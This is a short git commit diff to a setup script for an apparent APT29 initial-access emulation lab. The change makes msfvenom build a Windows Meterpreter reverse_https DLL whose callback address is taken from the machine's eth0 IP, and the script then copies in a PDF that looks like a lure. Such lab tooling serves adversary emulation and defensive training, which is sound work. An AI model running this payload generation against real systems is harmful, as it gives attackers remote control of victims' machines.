1fcadf1acdb0ea2fb345e32e2d4d1ae8e5418887
Govardhen Arunagiri <garunagiri@mitre.org>
2021-07-14 17:25:41 -0400

    automation now uses eth0 interface

--- labs/apt29_initial_access/automation/prep-automation.sh
+++ labs/apt29_initial_access/automation/prep-automation.sh
@@ -1,4 +1,7 @@
 #!/bin/bash
 
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.57.110 LPORT=443 -f dll > meterpreter.dll
+ipaddress=$(ip a | grep eth0 | grep inet | xargs | cut -d " " -f 2 | cut -d "/" -f 1)
+echo "[+] Using Local IP Address: " $ipaddress
+
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ipaddress LPORT=443 -f dll > meterpreter.dll
 cp ../ds7002.pdf .
